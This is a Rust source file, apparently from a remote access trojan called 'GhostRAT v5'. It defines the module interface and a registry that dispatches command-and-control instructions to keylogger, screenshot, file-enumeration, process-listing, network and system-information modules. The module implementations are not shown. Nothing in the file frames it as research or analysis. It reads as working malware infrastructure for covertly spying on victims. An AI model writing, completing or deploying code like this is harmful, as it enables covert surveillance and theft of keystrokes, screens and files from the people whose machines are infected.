//! Module trait and dispatcher for GhostRAT v5 modules.

pub mod keylogger;
pub mod screenshot;
pub mod file_enum;
pub mod process_list;
pub mod network;
pub mod system_info;

use anyhow::Result;
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use tokio::sync::Mutex;
use tracing::{debug, info};

pub use keylogger::KeyloggerModule;
pub use screenshot::ScreenshotModule;
pub use file_enum::FileEnumModule;
pub use process_list::ProcessListModule;
pub use network::NetworkModule;
pub use system_info::SystemInfoModule;

use crate::c2::Command;

/// Module error
#[derive(Debug, thiserror::Error)]
pub enum ModuleError {
    #[error("Execution failed: {0}")]
    Execution(String),
    #[error("IO error: {0}")]
    Io(#[from] std::io::Error),
    #[error("Not supported on this platform")]
    NotSupported,
    #[error("Permission denied")]
    PermissionDenied,
}

/// Trait for all GhostRAT modules
#[async_trait::async_trait]
pub trait Module: Send + Sync {
    fn name(&self) -> &str;
    async fn execute(&self, cmd: &Command) -> Result<Vec<u8>, ModuleError>;
}

/// Registry of all modules
#[derive(Clone)]
pub struct ModuleRegistry {
    inner: Arc<Mutex<Vec<Box<dyn Module>>>>,
}

impl ModuleRegistry {
    pub fn new() -> Self {
        let mut registry = Self {
            inner: Arc::new(Mutex::new(Vec::new())),
        };

        tokio::task::block_in_place(|| {
            tokio::runtime::Handle::current().block_on(async {
                let mut inner = registry.inner.lock().await;

                // Register all available modules
                inner.push(Box::new(KeyloggerModule::new()));
                info!("Registered module: keylogger");

                inner.push(Box::new(ScreenshotModule::new()));
                info!("Registered module: screenshot");

                inner.push(Box::new(FileEnumModule::new()));
                info!("Registered module: file_enum");

                inner.push(Box::new(ProcessListModule::new()));
                info!("Registered module: process_list");

                inner.push(Box::new(NetworkModule::new()));
                info!("Registered module: network");

                inner.push(Box::new(SystemInfoModule::new()));
                info!("Registered module: system_info");
            });
        });

        registry
    }

    /// Execute a command using the appropriate module
    pub async fn execute(&self, cmd: &Command, gpu_enabled: bool) -> Result<Vec<u8>, ModuleError> {
        let inner = self.inner.lock().await;

        for module in inner.iter() {
            let result = module.execute(cmd).await;
            match result {
                Ok(output) => {
                    debug!("Module {} returned {} bytes", module.name(), output.len());
                    return Ok(output);
                }
                Err(ModuleError::Execution(ref msg)) if msg.contains("no_match") => {
                    continue; // Try next module
                }
                Err(e) => {
                    return Err(e);
                }
            }
        }

        Err(ModuleError::Execution("No module matched command".to_string()))
    }
}
